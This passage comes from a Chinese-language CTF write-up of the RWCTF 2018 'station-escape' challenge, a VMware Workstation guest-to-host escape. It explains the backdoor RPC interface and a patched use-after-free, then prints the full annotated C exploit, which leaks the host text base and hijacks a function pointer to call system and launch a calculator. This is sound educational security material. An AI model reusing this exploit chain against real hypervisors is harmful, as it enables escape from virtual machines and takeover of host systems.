03 h ECX ( HI ) = 0004 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\uff1a EBX = 4 bytes from the reply data ( the first byte in LSB ) ECX = 00010000 h : success / 00000000 h : failure \u548c https://sites.google.com/site/chitchatvmback/backdoor \u4e2d\u6709\u51fa\u5165\u7684\u662f\uff0c\u5728\u5b9e\u9645\u7684\u9006\u5411\u5206\u6790\u4e2d\uff0cEBX\u4e2d\u5b58\u653e\u7684\u503c\uff0c\u4e0d\u662freply id\uff0c\u800c\u662freply type\uff0c\u4ed6\u51b3\u5b9a\u4e86\u6267\u884c\u7684\u8def\u5f84\u3002\u548c\u53d1\u9001\u6570\u636e\u4e00\u6837\uff0c\u6bcf\u6b21\u53ea\u80fd\u591f\u63a5\u53d74\u4e2a\u5b57\u8282\u7684\u6570\u636e\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 Recieve RPC reply length \u4e2d\u63d0\u5230\u8fc7\uff0c\u5e94\u7b54\u6570\u636e\u7684\u524d\u4e24\u4e2a\u5b57\u8282\u59cb\u7ec8\u8868\u793aRPC command\u7684\u72b6\u6001\u3002\u4e3e\u4f8b\u8bf4\u660e\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528RPC command\u8be2\u95ee machine.id.get \uff0c\u5982\u679c\u6210\u529f\u7684\u8bdd\uff0c\u4f1a\u8fd4\u56de 1 virtual machine id \uff0c\u5426\u5219\u4e3a 0 No machine id \u3002 void channel_recv_data ( int cookie1 , int cookie2 , int channel_num , int offset , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0004001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t in %%dx,%%eax \\n\\t add %%r11,%%rbp \\n\\t movl %%ebx,(%%rbp) \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); } Finish receiving RPC reply RPC subcommand\uff1a05h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = reply type from subcommand 03 h ECX ( HI ) = 0005 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\uff1a ECX = 00010000 h : success / 00000000 h : failure \u548c\u524d\u6587\u6240\u8ff0\u4e00\u6837\uff0c\u5728EBX\u4e2d\u5b58\u50a8\u7684\u662freply type\u3002\u5728\u63a5\u6536\u5b8creply\u7684\u6570\u636e\u540e\uff0c\u8c03\u7528\u6b64\u547d\u4ee4\u3002\u5982\u679c\u6ca1\u6709\u901a\u8fc7 Receive RPC reply data \u63a5\u6536\u5b8c\u6574\u4e2areply\u6570\u636e\u7684\u8bdd\uff0c\u5c31\u4f1a\u8fd4\u56defailure\u3002 void channel_recv_finish ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } Close RPC channel RPC subcommand\uff1a06h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number ECX ( HI ) = 0006 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\uff1a ECX = 00010000 h : success / 00000000 h : failure \u5173\u95edchannel\u3002 void channel_close ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0006001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } \u6f0f\u6d1e\u5206\u6790 \u867d\u7136\u662fRealWorld\u7684\u7ade\u8d5b\uff0c\u4f46\u662f\u56e0\u4e3a\u662f\u9b54\u6539\u7684VMWare Workstation\uff0c\u56e0\u6b64\u6211\u4eec\u901a\u8fc7\u4e8c\u8fdb\u5236\u6bd4\u5bf9\u7684\u65b9\u5f0f\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5230\u6f0f\u6d1e\u70b9\uff0c\u8282\u7701\u5927\u91cf\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5ba1\u8ba1\u548c\u6f0f\u6d1e\u6316\u6398\u7684\u65f6\u95f4\u3002 \u53ef\u4ee5\u53d1\u73b0\u51fa\u9898\u4eba\u4ec5\u4ec5\u4fee\u6539\u4e86\u4e24\u5904\uff0c\u4e00\u5904\u57280x1893c9\uff0c\u53e6\u4e00\u5904\u57280x1893e6\u3002\u5206\u522b\u5bf9\u4e24\u4e2a\u4f4d\u7f6e\u8fdb\u884c\u5206\u6790\uff1a \u9996\u5148\u57280x1893c9\u5904\uff0cchannel- out_msg_buf\u7f6enull\u7684\u64cd\u4f5c\u88abnop\u6389\u4e86\uff1a \u5176\u6b21\u57280x1893e6\u5904\u7684\u51fd\u6570\u8c03\u7528\u4e2d\uff0cv7 1\u53d8\u6210\u4e86v7 0x21\uff1a \u5728\u7b2c\u4e00\u5904patch\u4e2d\uff0cout_msg_buf\u6ca1\u6709\u88ab\u7f6e\u7a7a\uff0c\u5176\u6b21\u5728\u7b2c\u4e8c\u5904patch\u4e2d\uff0c\u539f\u5148\u88ab\u9650\u5236\u7684reply type( 0x1)\u53d8\u6210\u4e86 0x21,\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u5728Finish receiving RPC reply\u7684reply type\u4e2d\u53ef\u4ee5\u8bbe\u7f6e\u53e6\u5916\u4e00\u6761\u8def\u5f84\uff0c\u8fd9\u6761\u8def\u5f84\u4f1a\u5bfc\u81f4\u5728\u968f\u540e\u7684 v6 \u8fd9\u4e2a\u8c03\u7528(\u5b83\u4f1acall\u51fd\u6570 sub_177700 )\uff0c output buffer \u88ab free \u6389\u3002 void channel_recv_finish2 ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x21,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } \u6f0f\u6d1e\u5229\u7528 \u7531\u4e0a\u9762\u7684\u5206\u6790\u53ef\u4ee5\u77e5\uff0c\u8fd9\u4e2apatch\u4f1a\u5bfc\u81f4 UAF :\u5982\u679c\u6211\u4eec\u5728\u63a5\u6536\u5b8c\u6210\u4e4b\u540e\u8bbe\u7f6e\u4e86 0x20 \u8fd9\u4e2a\u4f4d\uff0c\u90a3\u4e48 output buffer \u5c31\u4f1a\u88ab\u91ca\u653e\u6389\uff0c\u4f46\u7531\u4e8e\u5b83\u6ca1\u6709\u88ab\u6e05\u96f6\uff0c\u6240\u4ee5\u7406\u8bba\u4e0a\u6211\u4eec\u53ef\u4ee5\u65e0\u9650\u6b21\u7684\u5c06\u5b83 free \u6389\u3002\u6709\u4e86\u8fd9\u4e9b\u6761\u4ef6\uff0c\u6211\u4eec\u8981\u5b8c\u6210\u6574\u4e2a\u5229\u7528\u5c31\u4e0d\u96be\u4e86\u3002 \u5229\u7528\u6b65\u9aa4\u5982\u4e0b: Leak: 1. \u5f00\u4e24\u4e2a channel:A\uff0cB 2. A \u7684 output buffer \u4e3a buf_A ,\u7136\u540e A \u91ca\u653e buf_A 3. \u8fd9\u65f6\u8ba9 B \u51c6\u5907\u7ed9 guest \u53d1 output , B \u4f1a\u5206\u914d\u4e00\u4e2a buffer \uff0c\u6211\u4eec\u5229\u7528 info-set \u548c info-get \u6765\u63a7\u5236\u6211\u4eec\u5206\u914d\u7684 buffer \u5927\u5c0f\uff0c\u4f7f\u5f97 B \u7684 output buffer: buf_B=buf_A \u3002 4. A \u518d\u6b21\u91ca\u653e buf_A \uff0c\u8fd9\u4e5f\u5bfc\u81f4\u4e86 buf_B \u88ab\u91ca\u653e\u3002\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5 leak \u51fa buf_B \u7684 fd \u4e86,\u4f46\u662f\u8fd9\u4e2a\u6307\u9488\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u6211\u4eec\u60f3\u8981\u7684\u662f text base \u3002 5. \u56e0\u6b64\u6211\u4eec\u518d\u6267\u884c\u547d\u4ee4 vmx.capability.dnd_version ,\u8fd9\u4f1a\u8ba9 host \u5206\u914d\u4e00\u5757\u5185\u5b58\u6765\u5b58\u653e\u4e00\u4e2a obj ,\u901a\u8fc7\u63a7\u5236 buffer \u5927\u5c0f\u6211\u4eec\u53ef\u4ee5\u521a\u597d\u8ba9 buf_B \u88ab\u7528\u6765\u5b58\u653e\u4e00\u4e2a obj \u3002\u800c\u8fd9\u4e2a obj \u91cc\u9762\u6709 vtable ,\u6211\u4eec\u53ef\u4ee5 leak \u51fa\u6765\u8ba1\u7b97 text base \u3002\u6ce8\u610f\u6211\u4eec\u4e00\u76f4\u6ca1\u6709\u63a5\u53d7 B \u7684\u8f93\u51fa\uff0c\u53ea\u662f\u8ba9\u5b83\u505a\u597d\u51c6\u5907(\u5206\u914doutput buffer)\u3002\u76f4\u5230\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u624d\u63a5\u53d7\u5b83\u7684\u8f93\u51fa\uff0c\u5b8c\u6210 leak Exploit \u6709\u4e86 leak \u7684\u65b9\u6cd5\uff0c exploit \u7684\u4e5f\u662f\u7c7b\u4f3c\u7684\u4e86\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f UAF \uff0c\u628a tcache \u7684 fd \u6539\u5230 bss \u6bb5\uff0c\u7136\u540e\u6539\u51fd\u6570\u6307\u9488\u4e3a system ,\u6700\u540e\u5f39 calculator \u6211\u7ed9\u4f5c\u8005\u7684exp\u52a0\u4e0a\u4e86\u6ce8\u91ca\uff0c\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003: #include stdio.h #include stdint.h void channel_open ( int * cookie1 , int * cookie2 , int * channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rdi,%%r10 \\n\\t movq %%rsi,%%r11 \\n\\t movq %%rdx,%%r12 \\n\\t movq %%rcx,%%r13 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0xc9435052,%%ebx \\n\\t movl $0x1e,%%ecx \\n\\t movl $0x5658,%%edx \\n\\t out %%eax,%%dx \\n\\t movl %%edi,(%%r10) \\n\\t movl %%esi,(%%r11) \\n\\t movl %%edx,(%%r12) \\n\\t movl %%ecx,(%%r13) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r8 , %r10 , %r11 , %r12 , %r13 ); } void channel_set_len ( int cookie1 , int cookie2 , int channel_num , int len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movl %%ecx,%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0001001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } void channel_send_data ( int cookie1 , int cookie2 , int channel_num , int len , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $0,%%r12 \\n\\t 1: \\n\\t movq %%r8,%%rbp \\n\\t add %%r12,%%rbp \\n\\t movl (%%rbp),%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0002001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t addq $4,%%r12 \\n\\t cmpq %%r12,%%r11 \\n\\t ja 1b \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); } void channel_recv_reply_len ( int cookie1 , int cookie2 , int channel_num , int * len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movq %%rcx,%%r11 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0003001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t movl %%ebx,(%%r11) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 ); } void channel_recv_data ( int cookie1 , int cookie2 , int channel_num , int offset , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0004001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t in %%dx,%%eax \\n\\t add %%r11,%%rbp \\n\\t movl %%ebx,(%%rbp) \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); } void channel_recv_finish ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } void channel_recv_finish2 ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x21,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } void channel_close ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0006001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } struct channel { int cookie1 ; int cookie2 ; int num ; }; uint64_t heap = 0 ; uint64_t text = 0 ; void run_cmd ( char * cmd ){ struct channel tmp ; int res , len , i ; char * data ; channel_open ( tmp . cookie1 , tmp . cookie2 , tmp . num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( tmp . cookie1 , tmp . cookie2 , tmp . num , strlen ( cmd ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( tmp . cookie1 , tmp . cookie2 , tmp . num , strlen ( cmd ) + 0x10 , cmd , res ); channel_recv_reply_len ( tmp . cookie1 , tmp . cookie2 , tmp . num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i += 4 ){ channel_recv_data ( tmp . cookie1 , tmp . cookie2 , tmp . num , i , data , res ); } printf ( recv data:%s \\n , data ); channel_recv_finish ( tmp . cookie1 , tmp . cookie2 , tmp . num , res ); if ( ! res ){ printf ( fail to recv finish \\n ); } channel_close ( tmp . cookie1 , tmp . cookie2 , tmp . num , res ); if ( ! res ){ printf ( fail to close channel \\n ); return ; } } void leak (){ struct channel chan [ 10 ]; int res = 0 ; int len , i ; char pay [ 8192 ]; char * s1 = info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ; char * data ; char * s2 = info-get guestinfo.a ; char * s3 = 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ; char * s4 = tools.capability.dnd_version 4 ; char * s5 = vmx.capability.dnd_version ; //init data run_cmd ( s1 ); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100); run_cmd ( s4 ); //first step channel_open ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), s2 , res ); channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i ++ ){ channel_recv_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , i , data , res ); } printf ( recv data:%s \\n , data ); //second step free the reply and let the other channel get it. channel_open ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , strlen ( s2 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , strlen ( s2 ) - 4 , s2 , res ); if ( ! res ){ printf ( fail to send data \\n ); return ; } //free the output buffer printf ( Freeing the buffer....,bp:0x5555556DD3EF \\n ); getchar (); channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish1 \\n ); return ; } //finished sending the command, should get the freed buffer printf ( Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC \\n ); getchar (); channel_send_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , 4 , s2 [ 16 ], res ); if ( ! res ){ printf ( fail to send data \\n ); return ; } //third step,free it again //set status to be 4 channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); //free the output buffer printf ( Free the buffer again... \\n ); getchar (); channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish2 \\n ); return ; } printf ( Trying to reuse the buffer as a struct, which we can leak.. \\n ); getchar (); run_cmd ( s5 ); printf ( Should be done.Check the buffer \\n ); getchar (); //Now the output buffer of chan[1] is used as a struct, which contains many addresses channel_recv_reply_len ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i += 4 ){ channel_recv_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , i , data , res ); } printf ( recv data: \\n ); for ( i = 0 ; i len ; i += 8 ){ printf ( recv data:%lx \\n , * ( long long * ) data [ i ]); } text = ( * ( uint64_t * ) data ) - 0xf818d0 ; printf ( Leak Success \\n ); } void exploit (){ //the exploit step is almost the same as the leak ones struct channel chan [ 10 ]; int res = 0 ; int len , i ; char * data ; char * s1 = info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB ; char * s2 = info-get guestinfo.b ; char * s3 = 1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB ; char * s4 = gnome-calculator \\x00 ; uint64_t pay1 = text + 0xFE95B8 ; uint64_t pay2 = text + 0xECFD0 ; //system uint64_t pay3 = text + 0xFE95C8 ; char * pay4 = gnome-calculator \\x00 ; run_cmd ( s1 ); channel_open ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , strlen ( s2 ), s2 , res ); channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } printf ( recv len:%d \\n , len ); data = malloc ( len + 0x10 ); memset ( data , 0 , len + 0x10 ); for ( i = 0 ; i len + 0x10 ; i += 4 ){ channel_recv_data ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , i , data , res ); } printf ( recv data:%s \\n , data ); channel_open ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_open ( chan [ 2 ]. cookie1 , chan [ 2 ]. cookie2 , chan [ 2 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_open ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish2 \\n ); return ; } channel_set_len ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , strlen ( s3 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } printf ( leak2 success \\n ); channel_recv_reply_len ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , len , res ); if ( ! res ){ printf ( fail to recv data len \\n ); return ; } channel_recv_finish2 ( chan [ 0 ]. cookie1 , chan [ 0 ]. cookie2 , chan [ 0 ]. num , res ); if ( ! res ){ printf ( fail to recv finish2 \\n ); return ; } channel_send_data ( chan [ 1 ]. cookie1 , chan [ 1 ]. cookie2 , chan [ 1 ]. num , 8 , pay1 , res ); channel_set_len ( chan [ 2 ]. cookie1 , chan [ 2 ]. cookie2 , chan [ 2 ]. num , strlen ( s3 ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_set_len ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , strlen ( s3 ), res ); channel_send_data ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , 8 , pay2 , res ); channel_send_data ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , 8 , pay3 , res ); channel_send_data ( chan [ 3 ]. cookie1 , chan [ 3 ]. cookie2 , chan [ 3 ]. num , strlen ( pay4 ) + 1 , pay4 , res ); run_cmd ( s4 ); if ( ! res ){ printf ( fail to set len \\n ); return ; } } void main (){ setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stderr , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 2 , 0 ); leak (); printf ( text base :%p , text ); exploit (); } Enjoy your calculator:) \u5173\u4e8e\u8c03\u8bd5 \u8c03\u8bd5\u6709\u70b9\u5c0f\u6280\u5de7\u9700\u8981\u8bf4\u660e\u4e00\u4e0b\u3002\u9996\u5148\u5c31\u662f\u6b63\u5e38\u7684\u628a vmware \u5f00\u8d77\u6765\uff0c\u7136\u540e\u5728 host \u7528 gdb \u6765 attach \u4e0a\u53bb\u3002\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u4f1a\u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u7ee7\u7eed\u8fd0\u884c\uff0c\u8fdb\u5165\u865a\u62df\u673a guest \u91cc\u9762\u8dd1 exploit \u811a\u672c\u3002\u4f46\u5927\u5bb6\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u8fd8\u5728 guest \u91cc\u9762\u7684\u65f6\u5019\uff0c host \u7684 gdb \u9047\u5230\u4e86\u65ad\u70b9\uff0c\u4f1a\u600e\u6837\uff1f \u56e0\u4e3a gdb \u9047\u5230\u4e86\u65ad\u70b9\uff0c\u90a3\u4e48 guest \u5c31\u88ab\u505c\u4f4f\u4e86\u3002\u7136\u800c\u4f60\u8fd8\u5728 guest \u91cc\u9762\uff0c\u4f60\u5c31\u6ca1\u6709\u529e\u6cd5\u6309 ctrl+alt \u5207\u51fa\u6765\u4e86\uff0c\u5c31\u50cf\u88ab\u4eba\u653e\u4e86\u4e00\u62db \u65f6\u95f4\u505c\u6b62 \u4e00\u6837\u3002\u8fd9\u4e2a\u65f6\u5019\u4f60\u9664\u4e86\u542b\u6cea\u5f3a\u5236\u5173\u673a\u4e4b\u5916\u6ca1\u6709\u4ec0\u4e48\u597d\u529e\u6cd5\u3002\u6240\u4ee5\u5927\u5bb6\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u8bb0\u5f97\u73b0\u5728exp\u5f00\u5934\u52a0\u4e2a sleep ,\u7136\u540e\u5728 sleep \u7684\u65f6\u5019\u8d76\u7d27\u628a\u9f20\u6807\u5207\u51fa\u6765\u5230 host \u4e2d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6b63\u5e38\u8c03\u8bd5\u4e86\u3002(PS:\u597d\u50cf mac \u4e0d\u4f1a\u6709\u8fd9\u4e2a\u95ee\u9898\uff0c\u56e0\u4e3a mac \u53ef\u4ee5\u76f4\u63a5\u7528\u89e6\u6478\u677f\u5207\u51fa\u6765?) \u76f8\u5173\u6750\u6599 \u9898\u76ee\u76f8\u5173\u6750\u6599\uff1a \u9898\u76ee\u64cd\u4f5c\u7cfb\u7edf\uff1aUbuntu x64 1804 \u76ee\u6807VMWare Workstation\uff1aVMware-Workstation-Full-15.0.2-10952284.x86_64.bundle\uff0c https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp patched VMX\uff1a https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E \u4e00\u4e9b\u53c2\u8003\u8d44\u6599\uff1a https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware https://www.52pojie.cn/thread-783225-1-1.html https://sites.google.com/site/chitchatvmback/backdoor","title":"RWCTF2018 station-escape"},{"location":"backup/realworldctf_2018_stationescape/#realworldctf-final-station-escape-writeup","text":"RWCTF Final 